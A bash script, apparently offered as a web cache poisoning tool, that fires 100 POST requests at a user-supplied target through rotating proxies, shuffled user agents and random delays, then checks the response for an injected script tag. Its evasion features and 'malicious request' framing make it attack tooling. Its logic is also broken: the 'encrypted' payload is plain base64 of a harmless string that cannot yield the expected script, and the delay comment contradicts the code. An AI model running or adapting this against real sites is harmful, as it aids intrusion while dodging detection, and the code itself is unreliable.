#!/bin/bash

# Color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Function to send a malicious request to the target website
send_malicious_request() {
    local target_url="$1"
    local session_cookie="$2"
    local referrer="$3"
    local proxy="$4"
    local payload="$5"
    
    # Send a request to the target URL with the malicious payload, custom headers, session persistence, and proxy
    curl -A "$(shuf -n 1 user_agents.txt)" -b "$session_cookie" -H "Referer: $referrer" -x "$proxy" -X POST -d "$payload" "$target_url" >/dev/null 2>&1
}

# Function to check if cache poisoning was successful
check_cache_poisoning() {
    local target_url="$1"
    local expected_content="$2"
    
    # Send a request to the target URL and check if the response contains the expected content
    local response=$(curl -s "$target_url")
    if [[ $response == *"$expected_content"* ]]; then
        echo -e "${GREEN}Cache poisoning successful!${NC}"
    else
        echo -e "${RED}Cache poisoning unsuccessful.${NC}"
    fi
}

# Main function to perform the cache poisoning test
cache_poisoning_test() {
    echo "Performing cache poisoning test..."
    local target_url

    # Prompt user to enter the target website URL
    read -p "Enter your target website URL: " target_url

    # Number of malicious requests to send
    local num_requests=100

    # Generate a random session cookie
    local session_cookie="session_$(date +%s)"

    # Generate a random referrer
    local referrer="http://referrer.com/page$(shuf -i 1-100 -n 1)"

    # List of proxies
    local proxies=("http://proxy1.example.com:8080" "http://proxy2.example.com:8080")

    # Payload to inject (encrypted for evasion)
    local payload="U2FtcGxlIFRva2VuOiBoaWdoICdkb25lJyEK"

    # Expected content in server response
    local expected_content="<script>alert('Cache Poisoning!');</script>"

    # Loop to send multiple malicious requests
    for ((i=1; i<=$num_requests; i++)); do
        echo "Sending malicious request $i..."
        proxy="${proxies[i % ${#proxies[@]}]}"  # Rotate through the list of proxies
        send_malicious_request "$target_url" "$session_cookie" "$referrer" "$proxy" "$payload" &
        sleep 0.$((RANDOM % 3))  # Random delay between 0 and 3 seconds
    done

    # Wait for all requests to complete
    wait

    # Check if cache poisoning was successful
    check_cache_poisoning "$target_url" "$expected_content"
}

# Execute the cache poisoning test
cache_poisoning_test
